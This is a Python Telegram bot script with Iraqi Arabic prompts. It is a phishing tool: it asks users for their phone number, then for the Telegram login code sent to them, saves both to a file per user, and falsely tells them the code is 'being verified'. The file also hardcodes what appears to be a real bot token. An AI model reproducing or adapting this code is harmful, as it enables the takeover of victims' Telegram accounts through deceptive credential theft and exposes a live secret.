import telebot

BOT_TOKEN = '7568164733:AAEU47nDdYIZ75Y7cXAbDqI9FpcxVVNv89w'
OWNER_ID = 7606838586  # استبدله برقمك

bot = telebot.TeleBot(BOT_TOKEN)

users_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "أهلاً بيك، أرسل رقم هاتفك مع رمز الدولة (مثال: +964...)")

@bot.message_handler(func=lambda m: m.text.startswith('+') and len(m.text) > 10)
def get_phone(message):
    user_id = message.from_user.id
    users_data[user_id] = {'phone': message.text}
    bot.send_message(message.chat.id, "زين هسة أرسللي رمز تسجيل الدخول الي وصلك من تلي")

@bot.message_handler(func=lambda m: m.from_user.id in users_data and 'phone' in users_data[m.from_user.id])
def get_code(message):
    user_id = message.from_user.id
    if 'code' not in users_data[user_id]:
        users_data[user_id]['code'] = message.text
        # نسوي ملف لكل مستخدم نحفظ به الرقم والرمز
        with open(f"user_{user_id}.txt", "w") as f:
            f.write(f"{users_data[user_id]['phone']}\n{users_data[user_id]['code']}")
        bot.send_message(message.chat.id, "تم استلام الرمز، جاري التحقق...")
    else:
        bot.send_message(message.chat.id, "تم استلام معلوماتك مسبقاً، يرجى الانتظار.")

bot.infinity_polling()
